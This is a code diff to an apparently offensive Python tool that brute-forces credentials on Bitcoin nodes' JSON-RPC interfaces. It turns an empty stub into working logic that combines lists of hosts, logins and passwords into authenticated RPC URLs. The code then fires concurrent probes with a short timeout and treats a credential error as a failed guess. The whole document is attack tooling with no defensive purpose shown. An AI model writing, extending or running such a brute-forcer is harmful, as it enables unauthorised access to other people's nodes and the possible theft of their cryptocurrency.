@@ -5,6 +5,10 @@ import linecache
 from collections import namedtuple
 from operator import itemgetter
 
+from aiobitcoin.grambitcoin import GramBitcoin
+from aiobitcoin.blockchain import Blockchain
+from aiobitcoin import bitcoinerrors
+
 from src.extra import utils
 from src.extra.pymongodb import PyMongoDB
 
@@ -14,8 +18,8 @@ class BruterBase:
 
     def __init__(self, **kwargs):
         self.brute_order = kwargs.get('brute_order')
+        self.num_threads = kwargs.get('threads')
         self._coin_name = kwargs.get('coin_name')
-        self._num_threads = kwargs.get('threads')
         self._unordered_data = {
             'H': PyMongoDB(db_name='jsonrpc', uri=kwargs.get('mongo_uri')),
             'L': kwargs.get('logins'),
@@ -48,6 +52,16 @@ class BruterBase:
             for line in range(start, end)
         )
 
+    def _get_data_block_by_point(self, data, point):
+        start, end = point, point + self.num_threads
+
+        if isinstance(data, str):
+            genexpr = self._get_data_from_file(data, start, end)
+        else:
+            genexpr = self._get_data_from_db(data, start, end)
+
+        return genexpr
+
     def _get_single_data_from_db(self, data, point):
         params = {
             'data': {'jsonrpc': {'$gt': 0}},
@@ -63,16 +77,6 @@ class BruterBase:
         return utils.clear_string(
             linecache.getline(data, point)
         )
-
-    def _get_data_block_by_point(self, data, point):
-        start, end = point, point + self._num_threads
-
-        if isinstance(data, str):
-            genexpr = self._get_data_from_file(data, start, end)
-        else:
-            genexpr = self._get_data_from_db(data, start, end)
-
-        return genexpr
 
     def _get_data_by_point(self, data, point):
         if isinstance(data, str):
@@ -114,33 +118,49 @@ class BruterBase:
             for j in range(second.count):
                 second_val = self._get_data_by_point(second.data, j)
 
-                for k in range(0, third.count, self._num_threads):
+                for k in range(0, third.count, self.num_threads):
                     third_range = self._get_data_block_by_point(third.data, k)
                     yield first_val, second_val, third_range
 
 
 class JSONRPCBruter(BruterBase):
-    _uri_template = ''
-
     def __init__(self, **kwargs):
         super(JSONRPCBruter, self).__init__(**kwargs)
 
-    async def bruteforce(self, host, login, password):
-        pass
+    @staticmethod
+    async def _close_gram_sessions(grams):
+        [await gram.close_session() for gram in grams]
+
+    @staticmethod
+    async def _get_uri(host, login, pwd):
+        return f'http://{login}:{pwd}@{host}'
+
+    async def _bruteforce(self, host, login, password, gram):
+        uri = await self._get_uri(host.split('//')[1], login, password)
+        blockchain = Blockchain(url=uri, gram=gram, read_timeout=.1)
+
+        try:
+            await blockchain.get_difficulty()
+        except bitcoinerrors.IncorrectCreds:
+            pass
 
     def _get_sorted_data(self, data):
         return map(
             lambda x: x[1], sorted(zip(self.brute_order, data), key=itemgetter(0))
         )
 
-    async def bruteforce_handler(self, args, rng):
+    async def _bruteforce_handler(self, args, rng, grams):
         await asyncio.gather(
-            *(self.bruteforce(*self._get_sorted_data((*args, val)))
-              for val in rng)
+            *(self._bruteforce(*self._get_sorted_data((*args, val)), gram)
+              for val, gram in zip(rng, grams))
         )
 
     async def run_bruteforce(self):
         while True:
+            grams = [GramBitcoin(session_required=True) for _ in range(self.num_threads)]
+
             for *args, rng in self.brute_data:
-                await self.bruteforce_handler(args, rng=rng)
+                await self._bruteforce_handler(args, rng=rng, grams=grams)
+
+            await self._close_gram_sessions(grams)
             break
